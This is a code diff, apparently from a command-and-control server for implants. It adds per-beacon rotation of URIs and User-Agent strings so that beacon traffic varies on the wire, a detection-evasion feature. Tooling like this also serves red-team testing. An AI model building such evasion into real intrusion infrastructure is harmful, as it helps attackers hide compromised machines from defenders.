@@ -249,6 +249,12 @@ func (s *Server) buildNetworkConfig(imp db.Implant, regKey []byte) (string, erro
 		// agent strips exactly effectiveCoverTokens — see its doc). Computed
 		// outside the config lock below: the helper takes RLock itself.
 		nc.MalleablePrepend, nc.MalleableAppend = s.effectiveCoverTokens()
+		// Per-beacon rotation pools (URI + User-Agent) so identical envelopes
+		// vary on the wire without rebuilds. Empty pools keep fixed values.
+		if uris, uas := s.profileBeaconPools(); len(uris) > 0 || len(uas) > 0 {
+			nc.BeaconURIs = strings.Join(uris, ",")
+			nc.UserAgents = strings.Join(uas, "\n")
+		}
 		s.configMu.RLock()
 		nc.RequestPrepend = s.cfg.Malleable.RequestPrepend
 		nc.RequestAppend = s.cfg.Malleable.RequestAppend
